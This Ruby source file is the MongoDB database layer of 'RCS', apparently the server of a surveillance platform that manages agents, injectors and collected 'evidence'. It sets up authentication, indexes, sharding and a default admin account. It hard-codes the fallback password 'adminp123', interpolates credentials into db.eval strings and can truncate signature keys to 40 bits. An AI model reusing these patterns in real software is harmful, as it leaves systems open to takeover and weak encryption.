#
# Layer for accessing the real DB
#

require_relative 'audit.rb'
require_relative 'config'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'mongo'
require 'mongoid'
require 'rbconfig'

# require all the DB objects
Dir[File.dirname(__FILE__) + '/db_objects/*.rb'].each do |file|
  require file
end

module RCS
module DB

class DB
  include Singleton
  include RCS::Tracer

  def initialize
    @available = false
    @auth_required = false
    @auth_user = 'root'
    @auth_pass = File.binread(Config.instance.file('mongodb.key')) if File.exist?(Config.instance.file('mongodb.key'))
  end

  def connect
    begin
      # this is required for mongoid >= 2.4.2
      ENV['MONGOID_ENV'] = 'yes'

      Mongoid.configure do |config|
        config.master = Mongo::Connection.new(Config.instance.global['CN'], 27017, pool_size: 50, pool_timeout: 15).db('rcs')
        config.persist_in_safe_mode = true
        #config.raise_not_found_error = false
        #config.logger = ::Logger.new($stdout)
      end

      #puts Mongoid.config.settings.inspect

      trace :info, "Connected to MongoDB"

      # check if we need to authenticate
      begin
        Mongoid.database.authenticate(@auth_user, @auth_pass)
        trace :info, "Authenticated to MongoDB"
        @auth_required = true
      rescue Exception => e
        trace :warn, "AUTH: #{e.message}"
      end

    rescue Exception => e
      trace :fatal, e
      return false
    end
    return true
  end

  def new_connection(db, host = Config.instance.global['CN'], port = 27017)
    time = Time.now
    db = Mongo::Connection.new(host, port).db(db)
    begin
      db.authenticate(@auth_user, @auth_pass) if @auth_required
    rescue Exception => e
      trace :warn, "AUTH: #{e.message}"
    end
    delta = Time.now - time
    trace :warn, "Opening new connection is too slow (%f)" % delta if delta > 0.5 and Config.instance.global['PERF']
    return db
  rescue Mongo::AuthenticationError => e
    trace :fatal, "AUTH: #{e.message}"
  end

  def ensure_mongo_auth
    # don't create the users if already there
    #return if @auth_required

    # ensure the users are created on master
    ['rcs', 'admin', 'config'].each do |name|
      trace :debug, "Setting up auth for: #{name}"
      db = new_connection(name)
      db.eval("db.addUser('#{@auth_user}', '#{@auth_pass}')")
    end

    # ensure the users are created on each shard
    shards = Shard.all
    shards['shards'].each do |shard|
      trace :debug, "Setting up auth for: #{shard['host']}"
      host, port = shard['host'].split(':')
      db = new_connection('rcs', host, port.to_i)
      db.eval("db.addUser('#{@auth_user}', '#{@auth_pass}')")
    end
  end

  # insert here the class to be indexed
  @@classes_to_be_indexed = [::Audit, ::User, ::Group, ::Alert, ::Core, ::Collector, ::Injector, ::Item, ::PublicDocument, ::EvidenceFilter]

  def create_indexes
    db = DB.instance.new_connection("rcs")

    trace :info, "Database size is: " + db.stats['dataSize'].to_s_bytes

    trace :info, "Ensuring indexing on collections..."

    @@classes_to_be_indexed.each do |k|
      # get the metadata of the collection
      coll = db.collection(k.collection_name)

      # skip if already indexed
      begin
        next if coll.stats['nindexes'] > 1
      rescue Mongo::OperationFailure
      end
      # create the index
      trace :info, "Creating indexes for #{k.collection_name}"
      k.create_indexes
    end

    # ensure indexes on every evidence collection
    collections = Mongoid::Config.master.collection_names
    collections.keep_if {|x| x['evidence.']}
    collections.delete_if {|x| x['grid.'] or x['files'] or x['chunks']}

    trace :debug, "Indexing #{collections.size} collections"

    collections.each do |coll_name|
      coll = db.collection(coll_name)
      e = Evidence.collection_class(coll_name.split('.').last)
      # number of index + _id + shard_key
      next if coll.stats['nindexes'] == e.index_options.size + 2
      trace :info, "Creating indexes for #{coll_name} - " + coll.stats['size'].to_s_bytes
      e.create_indexes
      Shard.set_key(coll, {type: 1, da: 1, aid: 1})
    end

    # index on shard id for the worker
    coll = db.collection('grid.evidence.files')
    coll.create_index('metadata.shard')
  end

  def enable_sharding
    if Shard.count == 0
      output = Shard.create(Config.instance.global['CN'])
      trace :info, "Adding the first Shard: #{output}"
      raise "Cannot create shard" unless output['ok'] == 1
    end
    output = Shard.enable('rcs')
    trace :info, "Enable Sharding on 'rcs': #{output}"
  end

  def shard_audit
    # enable shard on audit log, it will increase its size forever and ever
    db = DB.instance.new_connection("rcs")
    audit = db.collection('audit')
    Shard.set_key(audit, {time: 1, actor: 1}) unless audit.stats['sharded']
  end

  def ensure_admin
    # check that at least one admin is present and enabled
    # if it does not exists, create it
    if User.count(conditions: {enabled: true, privs: 'ADMIN'}) == 0
      trace :warn, "No ADMIN found, creating a default admin user..."
      User.where(name: 'admin').delete_all
      user = User.create(name: 'admin') do |u|
        if File.exist? Config.instance.file('admin_pass')
          pass = File.read(Config.instance.file('admin_pass'))
          FileUtils.rm_rf Config.instance.file('admin_pass')
        else
          pass = 'adminp123'
        end
        u[:pass] = u.create_password(pass)
        u[:enabled] = true
        u[:desc] = 'Default admin user'
        u[:privs] = ::User::PRIVS
        u[:locale] = 'en_US'
        u[:timezone] = 0
      end
      Audit.log :actor => '<system>', :action => 'user.create', :user_name => 'admin', :desc => "Created the default user 'admin'"

      group = Group.create(name: "administrators", alert: false)
      group.users << user
      group.save
      Audit.log :actor => '<system>', :action => 'group.create', :group_name => 'administrators', :desc => "Created the default group 'administrators'"
    end
  end

  def ensure_signatures
    if Signature.count == 0
      trace :warn, "No Signature found, creating them..."

      # NOTE about the key space:
      # the length of the key is 32 chars based on an alphabet of 16 combination (hex digits)
      # so the combinations are 16^32 that is 2^128 bits
      # if the license contains the flag to lower the encryption bits we have to
      # cap this to 2^40 so we can cut the key to 10 chars that is 16^10 == 2^40 bits

      Signature.create(scope: 'agent') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'collector') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'network') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'server') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
    end
    # dump the signature for NIA, Anon etc to a file
    File.open(Config.instance.cert('rcs-network.sig'), 'wb') {|f| f.write Signature.where(scope: 'network').first.value}
  end

  def ensure_cn_resolution
    # only for windows
    return unless RbConfig::CONFIG['host_os'] =~ /mingw/

    # don't add if it's an ip address
    return unless Config.instance.global['CN'] =~ /[a-zA-Z]/

    # make sure the CN is resolved properly in IPv4
    content = File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'rb') {|f| f.read}

    entry = "\r\n127.0.0.1\t#{Config.instance.global['CN']}\r\n"

    # check if already present
    unless content[entry]
      trace :info, "Adding CN (#{Config.instance.global['CN']}) to /etc/hosts file"
      content += entry
      File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'wb') {|f| f.write content}
    end
  rescue Exception => e
    trace :error, "Cannot modify the host file: #{e.message}"
  end

  def logrotate

    # perform the log rotation only at midnight
    time = Time.now
    return unless time.hour == 0 and time.min == 0

    trace :info, "Log Rotation"

    db = Mongo::Connection.new(Config.instance.global['CN'], 27017).db('admin')
    db.command({ logRotate: 1 })

    db = Mongo::Connection.new(Config.instance.global['CN'], 27018).db('admin')
    db.command({ logRotate: 1 })

    db = Mongo::Connection.new(Config.instance.global['CN'], 27019).db('admin')
    db.command({ logRotate: 1 })
  end

  def create_evidence_filters
    trace :debug, "Creating default evidence filters"
    ::EvidenceFilter.create_default
  end

  def clean_capped_logs
    # drop all the temporary capped logs collections
    collections = Mongoid::Config.master.collection_names
    collections.keep_if {|x| x['logs.']}

    db = DB.instance.new_connection("rcs")

    collections.each do |coll_name|
      trace :debug, "Dropping: #{coll_name}"
      db.collection(coll_name).drop
    end
  end

  def migrate_users_to_ext_privs
    ::User.where({:ext_privs.ne => true}).each do |user|
      trace :info, "Migrating user: #{user.name} to the new privs schema..."
      privs = user.privs
      privs += User::PRIVS.select{|p| p['ADMIN_']} if privs.include? 'ADMIN'
      privs += User::PRIVS.select{|p| p['SYS_']} if privs.include? 'SYS'
      privs += User::PRIVS.select{|p| p['TECH_']} if privs.include? 'TECH'
      privs += User::PRIVS.select{|p| p['VIEW_']} if privs.include? 'VIEW'
      user.privs = privs
      user.ext_privs = true
      user.save
    end
  end

end

end #DB::
end #RCS::
